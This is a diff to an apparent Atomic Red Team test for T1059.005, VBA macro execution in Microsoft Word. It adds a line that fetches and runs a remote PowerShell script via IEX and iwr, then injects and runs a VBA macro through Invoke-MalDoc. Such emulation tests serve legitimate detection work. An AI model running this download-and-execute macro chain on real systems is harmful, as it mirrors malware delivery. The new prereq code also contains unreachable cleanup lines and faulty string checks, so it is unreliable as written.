@@ -39,59 +39,39 @@ atomic_tests:
   supported_platforms:
   - windows
   input_arguments:
-    ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-      type: String
-      default: $(((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)[0])
-    sub_name:
-      description: Name of Sub to execute
-      type: String
-      default: Exec
     macrocode:
       description: Path to Macrocode to execute
       type: Path
       default: PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt
-    path_to_winword:
-      description: Path to WINWORD.EXE
-      type: Path
-      default: ""
   dependency_executor_name: powershell
   dependencies:
   - description: |
       Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependent registry keys
     prereq_command: |
-      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+      $wdApp = New-Object -COMObject "Word.Application"
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\$wdApp.Version) { exit 0 } else { exit 1 }
+      $wdApp.Quit()
+      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
+      [System.GC]::Collect()
+      [System.GC]::WaitForPendingFinalizers()
     get_prereq_command: |
       $xlApp = New-Object -ComObject "Word.Application"
       Stop-Process -Name WORD
   executor:
     command: |
-      if ("#{path_to_winword}" -eq "") {
-        $ver = "#{ms_office_version}".split(".")[0]
-        $path = "C:\Program Files\Microsoft Office\Office$ver\WINWORD.EXE"
-      } else {
-        $path = "#{path_to_winword}"
-      }
-
-      $macro = [System.IO.File]::ReadAllText("#{macrocode}")
-      $macro = $macro -replace "aREPLACEMEa", $path
-      
       $wdApp = New-Object -COMObject "Word.Application"
-      $wdApp.Visible = $false
-      $wdDoc = $wdApp.Documents.Add()
-      $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)
-      $vbaModule.CodeModule.AddFromString($macro) | Out-Null
-      $wdApp.Run("#{sub_name}")
-      $wdDoc.Close($false)
-      $wdApp.Quit()
-
-      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
-      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
-      [System.GC]::Collect()
-      [System.GC]::WaitForPendingFinalizers()
-
-      Remove-Variable wdDoc
-      Remove-Variable wdApp
+      if ($wdApp.Path -contains "(x86)") {
+        Write-Host "[-] You are running a 32 bit version of Office. This module requires a 64 bit install."
+        Break
+      } else {
+        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+        $macro = [System.IO.File]::ReadAllText("#{macrocode}")
+        Invoke-Maldoc -macroCode $macro -officeVersion $wdApp.Version -officeProduct "Word" -noWrap -sub "Exec"
+        $wdApp.Quit()
+        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
+        [System.GC]::Collect()
+        [System.GC]::WaitForPendingFinalizers()
+      }
     cleanup_command: |
       Get-WmiObject win32_process | Where-Object {$_.CommandLine -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
     name: powershell
